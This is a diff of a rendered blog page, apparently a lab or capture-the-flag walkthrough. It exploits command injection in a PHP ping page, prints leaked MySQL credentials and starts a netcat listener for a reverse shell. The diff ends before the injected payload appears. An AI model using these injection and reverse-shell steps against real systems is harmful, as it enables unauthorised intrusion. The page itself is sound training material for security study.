@@ -4,7 +4,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-    <meta name="generator" content="Hugo 0.74.3" />
+    <meta name="generator" content="Hugo 0.76.4" />
 
     <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
@@ -235,8 +235,8 @@ harold:x:501:501::/home/harold:/bin/bash
 apache
 </code></pre></div><p>So, we are running commands as <code>apache</code>, which explains why we can&rsquo;t just <code>cat /etc/shadow</code>&hellip;</p>
 <p>A <code>ls</code> and  a <code>cat</code> in the current directory allows us to peek at the php source code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">; cat index.php
-<span class="cp">&lt;?php</span>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="p">;</span> <span class="nx">cat</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
 	<span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;john&#34;</span><span class="p">,</span> <span class="s2">&#34;hiroshima&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
 	<span class="c1">//print &#34;Connected to MySQL&lt;br /&gt;&#34;;
 </span><span class="c1"></span>	<span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;webapp&#34;</span><span class="p">);</span>
@@ -257,14 +257,14 @@ apache
 </span><span class="s2">?&gt;
 </span></code></pre></div><p>Some creds here for mysql: <code>john:hiroshima</code>,  let&rsquo;s take a note of that somewhere.</p>
 <p>And <code>pingip.php</code> is exactly what we thought:</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">; cat pingit.php
-<span class="cp">&lt;?php</span>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="p">;</span> <span class="nx">cat</span> <span class="nx">pingit</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
 <span class="s1">&#39;;
 </span><span class="s1">        echo shell_exec( &#39;</span><span class="nx">ping</span> <span class="o">-</span><span class="nx">c</span> <span class="mi">3</span> <span class="s1">&#39; . $target );
 </span><span class="s1">        echo &#39;</span>
 
-<span class="err">&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span> 
-</code></pre></div><p>Okay, let&rsquo;s setup a reverse shell so we don&rsquo;t have to use the webpage for every command!</p>
+<span class="err">&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="err"> 
+</span></code></pre></div><p>Okay, let&rsquo;s setup a reverse shell so we don&rsquo;t have to use the webpage for every command!</p>
 <p>Run a listening netcat on the kali box:</p>
 <div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ nc -lvp 80
 </code></pre></div><p>Use this input in the &ldquo;administrative web console&rdquo;:</p>
